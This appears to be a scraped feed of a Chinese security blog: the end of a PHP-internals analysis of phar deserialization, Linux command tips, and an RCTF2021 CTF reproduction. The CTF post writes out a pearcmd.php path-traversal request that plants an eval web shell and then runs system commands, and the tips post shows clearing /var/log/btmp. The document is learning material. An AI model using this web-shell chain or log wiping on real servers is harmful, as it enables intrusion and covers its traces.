class="hljs-keyword">if</span> (!index) &#123;<br>array_init(&amp;gpc_element);<br><span class="hljs-keyword">if</span> ((gpc_element_p = zend_hash_next_index_insert(symtable1, &amp;gpc_element)) == <span class="hljs-literal">NULL</span>) &#123;<br>zend_array_destroy(Z_ARR(gpc_element));<br>zval_ptr_dtor_nogc(val);<br>free_alloca(var_orig, use_heap);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>gpc_element_p = zend_symtable_str_find(symtable1, index, index_len);<br><span class="hljs-keyword">if</span> (!gpc_element_p) &#123;<br>zval tmp;<br>array_init(&amp;tmp);<br>gpc_element_p = zend_symtable_str_update_ind(symtable1, index, index_len, &amp;tmp);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (Z_TYPE_P(gpc_element_p) == IS_INDIRECT) &#123;<br>gpc_element_p = Z_INDIRECT_P(gpc_element_p);<br>&#125;<br><span class="hljs-keyword">if</span> (Z_TYPE_P(gpc_element_p) != IS_ARRAY) &#123;<br>zval_ptr_dtor_nogc(gpc_element_p);<br>array_init(gpc_element_p);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>SEPARATE_ARRAY(gpc_element_p);<br>&#125;<br>&#125;<br>&#125;<br>symtable1 = Z_ARRVAL_P(gpc_element_p);<br><span class="hljs-comment">/* ip pointed to the &#x27;[&#x27; character, now obtain the key */</span><br>index = index_s;<br>index_len = new_idx_len;<br><br>ip++;<br><span class="hljs-keyword">if</span> (*ip == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<br>is_array = <span class="hljs-number">1</span>;<br>*ip = <span class="hljs-number">0</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">goto</span> plain_var;<br>&#125;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br></code></pre></td></tr></table></figure><p>总结一下吧</p><p>对于 ‘ ‘ 和  ‘.’ 成因在于,算是隐性的PHP特性</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (p = var; *p; p++) &#123;<br><span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27; &#x27;</span> || *p == <span class="hljs-string">&#x27;.&#x27;</span>) &#123;   <span class="hljs-comment">//空格 和 点 会被替换成下划线 </span><br>*p=<span class="hljs-string">&#x27;_&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;  <span class="hljs-comment">//如果变量的数组存在 [ 会被认为是array型的变量</span><br>is_array = <span class="hljs-number">1</span>;<br>ip = p;<br>*p = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于’[‘</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (p = var; *p; p++) &#123;<br><span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27; &#x27;</span> || *p == <span class="hljs-string">&#x27;.&#x27;</span>) &#123;   <span class="hljs-comment">//空格 和 点 会被替换成下划线 </span><br>*p=<span class="hljs-string">&#x27;_&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;  <span class="hljs-comment">//如果变量的数组存在 [ 会被认为是array型的变量</span><br>is_array = <span class="hljs-number">1</span>;   <span class="hljs-comment">//数组标志位</span><br>ip = p;<br>*p = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (is_array) &#123;<br>...<br>           ip++;<br>index_s = ip;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">isspace</span>(*ip)) &#123;<br>ip++;<br>&#125;<br><span class="hljs-keyword">if</span> (*ip==<span class="hljs-string">&#x27;]&#x27;</span>) &#123;<br>index_s = <span class="hljs-literal">NULL</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>ip = <span class="hljs-built_in">strchr</span>(ip, <span class="hljs-string">&#x27;]&#x27;</span>);<br><span class="hljs-keyword">if</span> (!ip) &#123;<br><span class="hljs-comment">/* PHP variables cannot contain &#x27;[&#x27; in their names, so we replace the character with a &#x27;_&#x27; */</span><br>*(index_s - <span class="hljs-number">1</span>) = <span class="hljs-string">&#x27;_&#x27;</span>;  <span class="hljs-comment">//这里就是&#x27;[&#x27;被替换成&#x27;_&#x27;的原因了 在处理数组的逻辑中如果找不到对应的 &#x27;[&#x27;就 替换为 &#x27;_&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="可反序列化函数成因"><a href="#可反序列化函数成因" class="headerlink" title="可反序列化函数成因"></a>可反序列化函数成因</h3><p>phar反序列化触发函数<code>finfo_file/finfo_buffer/mime_content_type</code></p><p>做题遇到的 稍微看看这里只看finfo_file这个函数</p><p>首先看看为什么phar可以用来做反序列化，在<code>/ext/phar/phar.c#line618</code>处phar在处理元数据(metadata)时调用了反序列化函数，如图</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201111149335.png" alt="image-20220111114936225">然后来看看 finfo_file 是如何触发反序列化的</p><p>追踪到 <code>/ext/fileinfo/fileinfo.c#line600</code> 发现了 finfo_file具体实现的函数_php_finfo_get_type</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201111149947.png" alt="image-20220111114944892"></p><p>跟进 _php_finfo_get_type #line432处，发现_php_finfo_get_type 的实现方法</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201111150269.png" alt="image-20220111115006179"></p><p>line553 发现这里有打开文件流的操作，且这行代码一定会执行一遍。这里使用的是php_stream系列的API，可以使用stream_get_wrapper看到系统内注册了哪一些wrapper</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201111150601.png" alt="image-20220111115022534"></p><p>发现了phar 因此我们理解了 finfo_file成为 phar反序列化影响函数的原因。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="PHP" scheme="https://d3n13d.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Linux日常小技巧</title>
    <link href="https://d3n13d.github.io/2022/01/09/Linux%E6%97%A5%E5%B8%B8%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    <id>https://d3n13d.github.io/2022/01/09/Linux%E6%97%A5%E5%B8%B8%E5%B0%8F%E6%8A%80%E5%B7%A7/</id>
    <published>2022-01-09T03:41:43.000Z</published>
    <updated>2022-02-10T00:10:29.495Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Linux日常使用小技巧"><a href="#Linux日常使用小技巧" class="headerlink" title="Linux日常使用小技巧"></a>Linux日常使用小技巧</h1><h2 id="定义你的环境变量"><a href="#定义你的环境变量" class="headerlink" title="定义你的环境变量"></a>定义你的环境变量</h2><p>基础用法：</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">export var_name=var_value<br></code></pre></td></tr></table></figure><p>永久生效你的环境变量</p><p>把生成环境变量的语句，放到一下任意一文件中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">/etc/profile<br>/etc/profile.d/*.sh<br>/etc/bashrc<br></code></pre></td></tr></table></figure><p>demo:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;export var_name=var_value&quot; &gt;&gt; /root/.bashrc\<br>source !$    #这个时候重新开一个shell echo $var_name 就可以发现我们的刚刚永久生效了<br></code></pre></td></tr></table></figure><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><h3 id="nohup"><a href="#nohup" class="headerlink" title="nohup"></a>nohup</h3><blockquote><p>nohup命令 可以将程序以忽略挂起信号的方式运行起来，被运行的程序的输出信息将不会显示到终端</p></blockquote><p>这个命令常常与 &amp; 相结合</p><p>demo:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">nohup ping www.baidu.com &amp;  #注意我们不要只会移动到后台执行，但是不知道怎么结束<br><span class="hljs-meta">#</span><span class="bash">下面给一个样例</span><br><span class="hljs-meta">#</span><span class="bash">利用 <span class="hljs-built_in">jobs</span> 命令查看后台进程，然后使用<span class="hljs-built_in">fg</span>命令将后台运行的或挂起的任务（或作业）切换到前台运行</span><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201091033363.png" alt="image-20220109103321273"></p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><blockquote><p>用来探测给定文件的类型,file命令 用来探测给定文件的类型。</p></blockquote><p>demo:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">filefilename  #用于帮助我们确定文件类型<br>file /usr/bin/ls  #解读可执行程序<br></code></pre></td></tr></table></figure><h3 id="fgrep"><a href="#fgrep" class="headerlink" title="fgrep"></a>fgrep</h3><blockquote><p>搜索文件中的字符串，只支持搜索字符串</p></blockquote><p>demo:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">fgrep -i flag 1  #在1这个文件中搜索含有flag的字符串<br>返回结果：<br>root@VM-24-13-debian:~# fgrep -i flag 1<br>flag&#123;This_is_test&#125;<br>ASFLAG<br></code></pre></td></tr></table></figure><h3 id="last"><a href="#last" class="headerlink" title="last"></a>last</h3><blockquote><p>列出目前与过去登入系统的用户相关信息</p></blockquote><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">last</span> -<span class="hljs-keyword">a</span>:    <span class="hljs-comment">#把从何处登入系统的主机名称或ip地址，显示在最后一行</span><br><span class="hljs-keyword">last</span> -n    <span class="hljs-comment">#(number不是字母5)</span><br><span class="hljs-keyword">last</span> -F    <span class="hljs-comment">#尽可能详细的说明时间信息</span><br><span class="hljs-keyword">last</span> root <span class="hljs-comment"># 显示root之前登录的信息</span><br></code></pre></td></tr></table></figure><h3 id="lastb"><a href="#lastb" class="headerlink" title="lastb"></a>lastb</h3><blockquote><p>列出登入系统失败的用户相关信息，你也许可以利用这个来获得攻击者的信息</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">lastb -a  #还是优先掌握这个吧，实质是读取/var/log/btmp <br>echo &gt; /var/log/btmp  清除lastb对应的文件内容<br></code></pre></td></tr></table></figure><h3 id="chattr"><a href="#chattr" class="headerlink" title="chattr"></a>chattr</h3><blockquote><p>用来改变文件属性</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">参数<br>-R 递归处理，将指定目录下的所有文件及子目录一并处理。<br>+&lt;属性&gt; 开启文件或目录的该项属性。<br>-&lt;属性&gt; 关闭文件或目录的该项属性。<br>=&lt;属性&gt; 指定文件或目录的该项属性。<br>i：不得任意更动文件或目录；<br>s：保密性删除文件或目录；<br>a：让文件或目录仅供附加用途<br><br>chattr +i /etc/my.cnf  #用chattr命令防止系统中某个关键文件被修改<br>lsattr /etc/my.cnf  #查看文件属性<br>chattr +a /var/log/message#某个文件只能往里面追加数据，但不能删除，适用于各种日志文件<br></code></pre></td></tr></table></figure><h3 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h3><p>几个不错的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">set number     #显示行号<br>set autoindent # 自动缩进<br>/value    #搜索vlaue这个字符串 使用 n进行上下切换<br>/value -c   #大小写不敏感搜索<br><span class="hljs-meta">%</span><span class="bash">s/foo/bar/g  <span class="hljs-comment">#%全局替换 把 foo 替换为bar</span></span>  <br>s/foo/bar/g  #替换当前行的foo<br><span class="hljs-meta">%</span><span class="bash">s/$/123/    <span class="hljs-comment">#在每一行的结尾追加123</span></span><br><span class="hljs-meta">%</span><span class="bash">s/^<span class="hljs-comment">#//      #删每一行开头的#</span></span><br></code></pre></td></tr></table></figure><p>参考公众号：入门小站</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="Linux" scheme="https://d3n13d.github.io/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>RCTF2021部分复现</title>
    <link href="https://d3n13d.github.io/2022/01/08/RCTF2021%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"/>
    <id>https://d3n13d.github.io/2022/01/08/RCTF2021%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-01-08T14:32:16.000Z</published>
    <updated>2022-01-30T01:58:49.564Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="RCTF2021复现"><a href="#RCTF2021复现" class="headerlink" title="RCTF2021复现"></a>RCTF2021复现</h1><p>来源：<a href="https://github.com/ccreater222/my-ctf-challenges/tree/master/RCTF2021/">https://github.com/ccreater222/my-ctf-challenges/tree/master/RCTF2021/</a></p><h2 id="VerySafe"><a href="#VerySafe" class="headerlink" title="VerySafe"></a>VerySafe</h2><p>虽然但是，复现有点恶心，环境啥也没有，不得不去看wp</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/ccreater222/my-ctf-challenges.git<br>cd /my-ctf-challenges/RCTF2021/VerySafe/docker/<br>docker-compose up -d<br></code></pre></td></tr></table></figure><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a><strong>前置知识</strong></h3><h4 id="pearcmd实现裸文件包含"><a href="#pearcmd实现裸文件包含" class="headerlink" title="pearcmd实现裸文件包含"></a>pearcmd实现裸文件包含</h4><p>利用条件：</p><ul><li>PHP 开启register_argc_argv</li><li>PHP以Server的形式运行</li></ul><p>pecl是PHP中用于管理扩展而使用的命令行工具，在Docker任意版本镜像中，pcel&#x2F;pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code></p><p>如图，在拖取下来的镜像中存在 pearcmd.php</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201081736563.png" alt="image-20220108173616492"></p><p>如果这是PHP开启了 <code>register_argc_argv</code> 这个选项，那么我们传入的参数将会被当做命令行参数 argv</p><blockquote><p>RFC3875中规定，如果query-string中不包含没有编码的&#x3D;，且请求是GET或HEAD，则query-string需要被作为命令行参数。但PHP没有严格按照RFC来处理，即使我们传入的query-string包含等号，也仍会被赋值给$_SERVER[‘argv’]</p></blockquote><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201081755960.png" alt="image-20220108175527866"></p><p>接着我们查看 <code>pearcmd.php</code> ，发现config-create参数可以帮助我们创建一个文件，且内容可控，那这个时候就可以写入一个shell</p><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>构建</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /../usr/local/lib/php/peclcmd.php?+config-create+/tmp/&lt;?=eval($_POST[<span class="hljs-number">1</span>]);?&gt;/*+/tmp/qqqq.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: yourhost:<span class="hljs-number">54120</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">96</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4664</span>.<span class="hljs-number">45</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> Edg/<span class="hljs-number">96</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1054</span>.<span class="hljs-number">29</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b<span class="hljs-number">3</span>;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-GB;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">Connection</span>: close<br><br></code></pre></td></tr></table></figure><p>然后</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /../tmp/hello.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: yourhost:<span class="hljs-number">54120</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">22</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">96</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4664</span>.<span class="hljs-number">45</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> Edg/<span class="hljs-number">96</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1054</span>.<span class="hljs-number">29</span><br><span class="hljs-attribute">Origin</span>: yourhost<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b<span class="hljs-number">3</span>;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Referer</span>: http://yourhost/tmp/hello.php<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-GB;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">Connection</span>: close<br><br><span class="hljs-attribute">1</span>=system(&#x27;/readflag&#x27;);<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201081809313.png" alt="image-20220108180908218"></p><p>成功getFlag</p><p>其他可利用的参数 install，download</p><h2 id="Easyphp"><a href="#Easyphp" class="headerlink" title="Easyphp"></a>Easyphp</h2><p>别看了，没复现出来</p><p>先看看nginx.conf</p><p>server {<br>    listen       80;<br>    listen  [::]:80;<br>    server_name  localhost;</p><div class="code-wrapper"><pre><code class="hljs">#access_log  /var/log/nginx/host.access.log  main;root   /var/www/html;location /admin &#123;    allow 127.0.0.1;   //admin页面只允许127.0.0.1的请求    deny all;&#125;location / &#123;    index  index.php;    try_files $uri @phpfpm;  //看寻找的$document.uri存不存在 不存在找@phpfpm 这里$document在第二行定义为 /var/www/html&#125;#error_page  404              /404.html;# redirect server error pages to the static page /50x.html#error_page   500 502 503 504  /50x.html;location = /50x.html &#123;    root   /usr/share/nginx/html;&#125;# proxy the PHP scripts to Apache listening on 127.0.0.1:80##location ~ \.php$ &#123;#    proxy_pass   http://127.0.0.1;#&#125;# pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000#location @phpfpm &#123;    include        fastcgi_params;    fastcgi_split_path_info ^(.+?\.php)(/.*)$;    fastcgi_pass   php:9000;   //fastcgi服务端口    fastcgi_index  index.php;  //fastcgi默认的主页资源    fastcgi_param  SCRIPT_FILENAME  $document_root/index.php;    fastcgi_param  REQUEST_URI  $uri;   //$uri请求资源给 REQUEST_URI&#125;# deny access to .htaccess files, if Apache&#39;s document root# concurs with nginx&#39;s one##location ~ /\.ht &#123;#    deny  all;#&#125;</code></pre></div><p>index.php 内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;flight/autoload.php&#x27;</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">flight</span>\<span class="hljs-title">Engine</span>;<br><span class="hljs-variable">$app</span> = <span class="hljs-keyword">new</span> Engine();<br><br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br><span class="hljs-variable">$password</span> = uniqid(<span class="hljs-string">&quot;asdfsadf&quot;</span>,<span class="hljs-literal">true</span>).<span class="hljs-string">&quot;YouWillNerveKnow&quot;</span>;<span class="hljs-comment">// you will never know the password 唯一标识符</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isdanger</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123;  <span class="hljs-comment">//检测危险参数</span><br>    <span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$v</span>))&#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$v</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$value</span>)&#123;<br>            <span class="hljs-keyword">if</span>(isdanger(<span class="hljs-variable">$k</span>)||isdanger(<span class="hljs-variable">$value</span>))&#123;  <span class="hljs-comment">//如果传入数组 =&gt; </span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$v</span>,<span class="hljs-string">&quot;../&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;  <span class="hljs-comment">//如果存在 ../ =&gt; 危险</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-variable">$app</span>-&gt;before(<span class="hljs-string">&quot;start&quot;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">foreach</span>([<span class="hljs-variable">$_GET</span>,<span class="hljs-variable">$_POST</span>,<span class="hljs-variable">$_COOKIE</span>,<span class="hljs-variable">$_FILES</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>)&#123;<br>        <span class="hljs-keyword">if</span>(isdanger(<span class="hljs-variable">$value</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;go away hack&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;);<br><span class="hljs-variable">$app</span>-&gt;route(<span class="hljs-string">&#x27;/*&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-variable">$request</span> = <span class="hljs-variable">$app</span>-&gt;request();<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;head&quot;</span>,[],<span class="hljs-string">&quot;head_content&quot;</span>);<br>    <span class="hljs-keyword">if</span>(stristr(<span class="hljs-variable">$request</span>-&gt;url,<span class="hljs-string">&quot;login&quot;</span>)!==<span class="hljs-literal">FALSE</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>])&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span 